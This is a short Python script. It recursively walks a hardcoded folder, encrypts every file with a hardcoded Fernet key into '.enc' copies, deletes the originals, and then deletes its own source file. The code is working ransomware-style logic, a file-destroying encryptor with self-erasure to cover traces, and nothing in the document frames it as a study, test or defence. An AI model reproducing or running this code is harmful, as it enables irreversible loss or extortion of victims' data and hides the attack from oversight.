import os
from cryptography.fernet import Fernet

def encrypt_files(path, key):
    f = Fernet(key)
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f1:
                data = f1.read()
            encrypted_data = f.encrypt(data)
            with open(file_path + '.enc', 'wb') as f2:
                f2.write(encrypted_data)
            os.remove(file_path)

def delete_script():
    os.remove(__file__)

path = r'C:\share C\vscode\Pass\test'
key = b'gQHAjOvQ8tUkqHqrfwXs8uVwdsgLmItRH4JZ2xz18l0='

encrypt_files(path, key)
delete_script()
